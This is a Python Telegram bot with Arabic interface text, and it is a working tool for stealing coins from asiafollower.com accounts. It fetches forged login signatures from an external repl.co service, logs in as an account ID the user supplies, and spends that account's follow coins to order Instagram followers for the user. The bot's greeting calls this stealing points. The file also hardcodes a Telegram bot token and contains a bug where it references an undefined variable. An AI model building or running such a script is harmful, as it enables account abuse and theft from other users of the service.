import requests
from config import *
import random,time,base64,os

import requests
import random,time,base64,os
def check(X):
	user="".join(random.choice("msjsjjsjsjwlppitomvclqorutbckwpvyclibenvpiuw")for i in range(8))
	message2 = user
	message_bytes2 = message2.encode('ascii')
	base64_bytes2 = base64.b64encode(message_bytes2)
	base64_message2= base64_bytes2.decode('ascii')
	re = requests.get(f"https://Cipher.mhmdltyy.repl.co?usname={user}&usid={X}&submit=submit").text
#print(re)
#print(re)
	uns = re.split('un:')[1]
	un = uns.split(':un')[0]
#print(un)
#print(un)
	uhlogin = re.split('uhlogin:')[1]
	uhlog = uhlogin.split(':uhlogin')[0]
#print(uhlog)


	keys = re.split('key:')[1]
	key = keys.split(':key')[0]
#print(key)

#print(key)


	uhs = re.split('uh:')[1]
	uh = uhs.split(':uh')[0]

#print(uh)

	ahs= re.split('ah:')[1]
	ah = ahs.split(':ah')[0]

#print(ah)

	aks= re.split('ak:')[1]
	ak = aks.split(':ak')[0]

#print(ak)

	uis= re.split('ui:')[1]
	ui = uis.split(':ui')[0]
#print(ui)

#print(ak)
#________--_____________-________________
	un1= re.split('un1:')[1]
	un1 = un1.split(':un1')[0]

#print(un1)

	uh1= re.split('uh1:')[1]
	uh1 = uh1.split(':uh1')[0]
#print(uh1)

	ak1= re.split('ak1:')[1]
	ak1 = ak1.split(':ak1')[0]
#print(ak1)

	ah1= re.split('ah1:')[1]
	ah1 = ah1.split(':ah1')[0]
#print(ah1)
	un2= re.split('un2:')[1]
	un2 = un2.split(':un')[0]
	#print(un2)
	ah2= re.split('ah2:')[1]
	ah2 = ah2.split(':ah2')[0]
	#print(ah2)
	ak2= re.split('ak2:')[1]
	ak2 = ak2.split(':ak2')[0]
	#print(ak2)

	




	headers = {
    'Host': 'asiafollower.com',
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '714',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}

	data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": base64_message2,
  "u_h": uhlog+"\u003d\u003d",
  "a_h": ah+"\u003d",
  "a_k": ak,
  "u_i":ui
}
	re = requests.post('https://asiafollower.com/api/v5/loginUser', headers=headers,json=data,proxies=None).text
	if "null" in re:
		return {"coin": "الايبي الخاص بك محضور رجائا فعل super vpn"}

#print(re)
	if "success" in re:
		take = re.split('"token":"')[1]
		tokens = take.split('"')[0]
		headers = {
    'Host': 'asiafollower.com',
    'token': tokens,
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '830',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}
		data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": un1+"\u003d",
  "u_h": uh,
  "a_h": ah1+"\u003d",
  "a_k": ak1+"\u003d",
  "username": user
}
		res = requests.post('https://asiafollower.com/api/v5/getUserInfo', 		headers=headers,json=data)
		if res.json()["message"]=="حساب کاربری شما مسدود می باشد!":
			return {"coin": "هاذا الايدي محضور"}
		res=res.text
		ccs = res.split('"follow_coin":')[1].split(",")[0]
		return {"coin": ccs}
def get(myide,X):	
	user="".join(random.choice("qamfpiahbcmkakjbcnmwmmnfjcjncpqotfehjrjd")for i in range(8))
	message2 = user
	message_bytes2 = message2.encode('ascii')
	base64_bytes2 = base64.b64encode(message_bytes2)
	base64_message2= base64_bytes2.decode('ascii')

	re = requests.get(f"https://Cipher.mhmdltyy.repl.co?usname={user}&usid={X}&submit=submit").text
#print(re)
#print(re)
	uns = re.split('un:')[1]
	un = uns.split(':un')[0]
#print(un)
#print(un)
	uhlogin = re.split('uhlogin:')[1]
	uhlog = uhlogin.split(':uhlogin')[0]
#print(uhlog)


	keys = re.split('key:')[1]
	key = keys.split(':key')[0]
#print(key)

#print(key)


	uhs = re.split('uh:')[1]
	uh = uhs.split(':uh')[0]

#print(uh)

	ahs= re.split('ah:')[1]
	ah = ahs.split(':ah')[0]

#print(ah)

	aks= re.split('ak:')[1]
	ak = aks.split(':ak')[0]

#print(ak)

	uis= re.split('ui:')[1]
	ui = uis.split(':ui')[0]
#print(ui)

#print(ak)
#________--_____________-________________
	un1= re.split('un1:')[1]
	un1 = un1.split(':un1')[0]

#print(un1)

	uh1= re.split('uh1:')[1]
	uh1 = uh1.split(':uh1')[0]
#print(uh1)

	ak1= re.split('ak1:')[1]
	ak1 = ak1.split(':ak1')[0]
#print(ak1)

	ah1= re.split('ah1:')[1]
	ah1 = ah1.split(':ah1')[0]
#print(ah1)
	un2= re.split('un2:')[1]
	un2 = un2.split(':un')[0]
	#print(un2)
	ah2= re.split('ah2:')[1]
	ah2 = ah2.split(':ah2')[0]
	#print(ah2)
	ak2= re.split('ak2:')[1]
	ak2 = ak2.split(':ak2')[0]
	#print(ak2)

	




	headers = {
    'Host': 'asiafollower.com',
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '714',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}

	data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": base64_message2,
  "u_h": uhlog+"\u003d\u003d",
  "a_h": ah+"\u003d",
  "a_k": ak,
  "u_i":ui
}
	re = requests.post('https://asiafollower.com/api/v5/loginUser', headers=headers,json=data,proxies=None).text
	if "null" in re:
		return {"status": "الايبي الخاص بك محضور رجائا فعل super vpn"}

#print(re)
	if "success" in re:
		take = re.split('"token":"')[1]
		tokens = take.split('"')[0]
		headers = {
    'Host': 'asiafollower.com',
    'token': tokens,
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '830',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}
		data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": un1+"\u003d",
  "u_h": uh,
  "a_h": ah1+"\u003d",
  "a_k": ak1+"\u003d",
  "username": user
}
		res = requests.post('https://asiafollower.com/api/v5/getUserInfo', 		headers=headers,json=data)
		if res.json()["message"]=="حساب کاربری شما مسدود می باشد!":
			return {"status": "اهاذا الايدي محضور"}
#print(res)
		res = res.text
		ccs = res.split('"follow_coin":')[1]
		cccs = ccs.split(',')[0]
		cccl=int(cccs)
		mco= int(cccl / 2)
			
		if int(cccs)>=200:
			data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": un2+"\u003d",
  "u_h": uh+"\u003d",
  "a_h": ah2+"\u003d",
  "a_k": ak2+"\u003d",
  "pk": myide,
  "image_url": "https://instagram.fdel3-2.fna.fbcdn.net/v/t51.2885-19/272291055_530654998005277_8614632769092051474_n.jpg?stp\u003ddst-jpg_s150x150\u0026_nc_ht\u003dinstagram.fdel3-2.fna.fbcdn.net\u0026_nc_cat\u003d101\u0026_nc_ohc\u003dXZlqwOYAhuEAX9NlF54\u0026edm\u003dAEF8tYYBAAAA\u0026ccb\u003d7-4\u0026oh\u003d00_AT96ctLMqf2-fiJc-feIwr--oYJgRXR4bULW0nBvAZGJbw\u0026oe\u003d628A1597\u0026_nc_sid\u003da9513d",
  "username": user,
  "order_value": "",
  "order_link": user,
  "order_type": "follow",
  "order_count": str(mco),
  "start_count": "120647882",
  "is_special": "false",
  "show_pic": "true"
}
			res= requests.post('https://asiafollower.com/api/v5/setOrder', headers=headers,json=data).text
			if "This account has an ongoing order and an order in line, to complete previous orders, please wait." in res:
				return {"status": "رجائا انتضر انتهاء الطلب السابق"}
			elif "success" in res:
				return {"status": "تم رشق "+mko+" متابع"}
			else:
				return {"status": "خطأ غير معروف"}
		else:
			return {"status": "لايوجد نقاط"}
			
	
			
			
import telebot
from flask import *
from telebot import *
BOT_TOKEN="5479271930:AAHjkkARpHsIjXst2QSqEZBOZEVNWMaj7Vw"
stopi=[] 			



server=Flask (__name__)
a1=types.InlineKeyboardButton(text="رفع ادمن",callback_data="addadmin")
a2=types.InlineKeyboardButton(text="تنزيل ادمن",callback_data="deladmin")
a3=types.InlineKeyboardButton(text="اضافه اشتراك",callback_data="addsub")
a4=types.InlineKeyboardButton(text="الغاء اشتراك",callback_data="delsub")
a5=types.InlineKeyboardButton(text="فحص النقاط",callback_data="start")
a6=types.InlineKeyboardButton(text="لوحة المشتركين",callback_data="sub1")
a7=types.InlineKeyboardButton(text="لوحة الادمنيه",callback_data="sub2")
a8=types.InlineKeyboardButton(text="سحب النقاط",callback_data="stop")

progr=["L_L_5_L","J_W_2"]
admins=[]
subs=[]
def stopi(message):
	id=message.chat.id
	op1=bot.send_message(id,"حسنا عزيزي ارسل الايدي التريد ترشقله متابعين")
	bot.register_next_step_handler(op1,stopi1)
def stopi1(message):
	global myid
	myid=message.text
	id = message.chat.id
	
	op2=bot.send_message(id,"حسنا عزيزي ارسل الايدي التريد تسحب منه النقاط")
	bot.register_next_step_handler(op2,stopi2)
def stopi2(message):
	global X
	X=message.text
	id=message.chat.id
	bot.send_message(id,get(myid,X)["status"])
	
def delsu(message):
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	km=bot.send_message(id,"اهلا بك🙋‍♂️\nارسل يوزر الشخص")
	bot.register_next_step_handler(km,delsu1)
def delsu1(message):
	global user
	user=message.text
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	if user in subs:
	    
	    
		subs.remove(user)
		bot.send_message(id,f"تم الغاء اشتراك المستخدم : @{user}")
		bot.send_message(2011937286,f"الادمن قام بالغاء اشتراك\nاسم الادمن : {name}\nيوزر الادمن : {username}\nيوزر الشخص القام بالغاء اشتراكه : @{user}")
	else:
		bot.send_message(id,"لايوجد مشترك بهاذا اليوزر")
def addsu(message):
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	kmpoi=bot.send_message(id,"اهلا بك🙋‍♂️\nارسل يوزر الشخص")
	bot.register_next_step_handler(kmpoi,addsu1)
def addsu1(message):
	global user
	user=message.text
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	if user in subs:
		bot.send_message(id,"هاذا اليوزر مشترك من قبل")
	else:
		subs.append(user)
		bot.send_message(id,f"تم عمل اشتراك للمستخدم : @{user}")
		bot.send_message(2011937286,f"الادمن قام بعمل اشتراك\nاسم الادمن : {name}\nيوزر الادمن : {username}\nيوزر الشخص القام بعمل له اشتراك : @{user}")

def addadm(message):
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	kmp=bot.send_message(id,"اهلا بك🙋‍♂️\nارسل يوزر الشخص")
	bot.register_next_step_handler(kmp,addadm1)
def addadm1(message):
	global user
	user=message.text
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	if user in admins:
		bot.send_message(id,"هاذا المستخدم ادمن من قبل")
	else:
		admins.append(user)
		bot.send_message(id,f"تم رفع المستخدم : @{user}")

def deladm(message):
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	kmpo=bot.send_message(id,"اهلا بك🙋‍♂️\nارسل يوزر الشخص")
	bot.register_next_step_handler(kmpo,deladm1)
def deladm1(message):
	global user
	user=message.text
	id=message.chat.id
	username = message.chat.username
	name=message.chat.first_name
	if user in admins:
		admins.remove(user)
		bot.send_message(id,f"تم تنزيل المستخدم : @{user}")

	else:
		bot.send_message(id,"لايوجد ادمن بهاذا اليوزر")
def sub1(message):
	id=message.chat.id
	bot.send_message(id,f"{subs}")
def sub2(message):
	id=message.chat.id
	bot.send_message(id,f"{admins}")
def kop(message):
	id=message.chat.id
	op=bot.send_message(id,"حسنا ارسل الايدي")
	bot.register_next_step_handler(op,kiop)
def kiop(message):
 		id=message.chat.id
 		username=message.chat.username
 		myid=message.text
 		coin12=0
 		if username in subs or username in admins or username in progr:
 			bot.send_message(id,check(myid)["coin"])
 		else:
 			bot.send_message(id,"""عذرا عزيزي انت غير مشترك في البوت\n\nراسل المطور للتفعيل : @L_L_5_L""")
 			
 			
	
	
import os
E = "\033[1;32m"
L= "\033[1;35m"
B="\033[1;36m"
bot=TeleBot("5479271930:AAHjkkARpHsIjXst2QSqEZBOZEVNWMaj7Vw")
@bot.message_handler(commands=["start"])

def mj(message):
 id= message.chat.id
 username=message.chat.username
 name=message.chat.first_name
 kas=types.InlineKeyboardMarkup(row_width=1)
 kas.add(a5)
 kas.add(a8)
 bot.send_message(id,f"اهلا بك عزيزي {name}\n\nبوت خمط نقاط كولد فالور\n\nاختر من الازرار تحت",reply_markup=kas)
 @bot.message_handler(commands=["admin"])
 def adss(message):
 	 id= message.chat.id
 	 username=message.chat.username
 	 name=message.chat.id

 	 if username in admins or username in progr:
 	 	mas = types.InlineKeyboardMarkup(row_width=2)
 	 	if username in progr:
 	 		mas.add(a1,a2,a3,a4,a6,a7)
 	 		msga="""ياهلا بمطوري 🙋‍♂️
اختر من الازرار تحت"""
 	 	else:
 	 		mas.add(a3,a4,a6,a7)
 	 		msga="""ياهلا بلدمن 🙋‍♂️
اختر من الازرار تحت"""
 	 		
 	 	bot.send_message(id,msga,reply_markup=mas)
 	 	
@bot.callback_query_handler(func=lambda call : True)
def callback(call):
	message=call.message
	if call.data=="start":
		username=message.chat.username
		id = message.chat.id
		if username in subs or username in admins or username in progr:
			kop(call.message)
		else:
			bot.send_message(id,"""عذرا عزيزي انت غير مشترك في البوت\n\nراسل المطور للتفعيل : @L_L_5_L""")
	elif call.data=="stop":
		username=message.chat.username
		id = message.chat.id
		if username in subs or username in admins or username in progr:
			stopi(call.message)
		else:
			bot.send_message(id,"""عذرا عزيزي انت غير مشترك في البوت\n\nراسل المطور للتفعيل : @L_L_5_L""")
	elif call.data=="addsub":
		addsu(call.message)
	elif call.data=="delsub":
		delsu(call.message)
	elif call.data=="deladmin":
		deladm(call.message)
	elif call.data=="addadmin":
		addadm(call.message)
	elif call.data=="sub1":
		sub1(call.message)
	elif call.data=="sub2":
		sub2(call.message)
@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200


if __name__ =="__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://insta-bo.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
